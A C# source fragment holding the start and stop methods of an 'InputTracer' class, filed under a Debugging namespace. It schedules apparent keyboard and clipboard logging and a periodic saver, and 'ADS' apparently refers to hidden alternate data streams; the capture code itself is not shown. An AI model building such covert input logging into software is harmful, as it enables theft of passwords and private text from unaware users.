using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Diagnostics;

using Asmodat.Abbreviate;
using Asmodat.Types;

using System.Resources;

using Asmodat.IO;

namespace Asmodat.Debugging
{
    public partial class InputTracer
    {
        
        
        public void StartKeyboardTracer()
        {
            if (Timers != null)
                Timers.Run(() => KeyboardTracer(), 1, "KeyboardTracer", true, true);

            
            TimeAction = TickTime.Now;
        }

        public void StarClipboardTracer(int TraceClipboardMinLength = 4, int TraceClipboardMaxLength = 64)
        {
            this.TraceClipboardMinLength = TraceClipboardMinLength;
            this.TraceClipboardMaxLength = TraceClipboardMaxLength;

            if (Timers != null)
                Timers.Run(() => ClipboardTracer(), 1000, "ClipboardTracer", true, true);

            TimeAction = TickTime.Now;
        }

        public void StartSaverADS(int saveInterval)
        {
            if (saveInterval > 0)
                Timers.Run(() => Saver(), saveInterval, "SaverADS", true, true);


            TimeAction = TickTime.Now;
        }


        public void Stop()
        {
            if(Timers != null)
                Timers.TerminateAll();

            TimeStop = TickTime.Now;
            TimeAction = TickTime.Now;
        }



    }
}
